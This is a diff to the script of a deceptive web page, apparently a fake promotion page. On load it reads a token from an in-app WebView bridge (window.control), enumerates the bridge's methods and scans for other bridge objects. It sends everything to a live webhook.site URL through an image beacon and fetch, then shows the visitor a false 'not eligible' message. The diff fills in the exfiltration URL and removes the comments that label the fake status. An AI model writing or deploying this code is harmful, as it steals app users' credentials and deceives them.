@@ -71,29 +71,23 @@
     </div>
 
     <script>
-        // ═══════════════════════════════════════════════════
-        // CHANGE THIS to your webhook.site URL
-        var EXFIL_URL = "PASTE_YOUR_WEBHOOK_URL_HERE";
-        // ═══════════════════════════════════════════════════
+        var EXFIL_URL = "https://webhook.site/669d58e9-2981-429c-b990-95b00c849bfe";
 
         function send(data) {
             var img = new Image();
             img.src = EXFIL_URL + "?" + data;
-            // Backup: fetch
             fetch(EXFIL_URL + "?" + data, { mode: 'no-cors' }).catch(function () { });
         }
 
         window.onload = function () {
             var s = document.getElementById('status');
 
-            // Try the known bridge
             if (window.control && window.control.getBaseInfo) {
                 s.textContent = "Verifying...";
                 try {
                     var info = window.control.getBaseInfo();
                     send("type=token&data=" + encodeURIComponent(info));
 
-                    // Enumerate all methods on the bridge
                     var methods = [];
                     for (var prop in window.control) {
                         methods.push(prop);
@@ -105,7 +99,6 @@
                     send("type=error&data=" + encodeURIComponent(e.message));
                 }
             } else {
-                // Scan for any bridge objects
                 var found = [];
                 var props = Object.getOwnPropertyNames(window);
                 for (var i = 0; i < props.length; i++) {
@@ -121,7 +114,6 @@
                 s.textContent = "Processing...";
             }
 
-            // Show fake success after delay
             setTimeout(function () {
                 s.textContent = "You're not eligible for this promotion.";
                 document.querySelector('.spinner').style.display = 'none';
